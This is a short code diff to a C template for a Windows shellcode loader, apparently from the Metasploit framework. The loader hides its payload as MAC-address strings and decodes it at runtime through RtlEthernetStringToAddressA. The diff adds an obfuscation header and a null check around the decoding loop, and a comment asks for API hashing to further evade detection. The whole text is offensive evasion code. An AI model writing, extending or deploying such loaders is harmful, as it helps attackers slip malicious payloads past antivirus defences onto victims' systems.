@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
 #define SCSIZE <%= encoded_payload_length %>
 #define SCSIZE_ENC <%= encrypted_payload_length %>
@@ -27,9 +28,11 @@ void DecodePayload()
     //TODO: API hashing here pls
     fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary(("ntdll.dll")), ("RtlEthernetStringToAddressA"));
 
-    for (int i = 0; i != SCSIZE ; i+=1) {
-        fncMacDeobfuscate(bPayloadEncoded+i*18, &terminator, (LPCSTR)tmp);
-        tmp = tmp + 6;
+    if(fncMacDeobfuscate){ 
+      for (int i = 0; i != SCSIZE ; i+=1) {
+          fncMacDeobfuscate(bPayloadEncoded+i*18, &terminator, (LPCSTR)tmp);
+          tmp = tmp + 6;
+      }
     }
 }
 
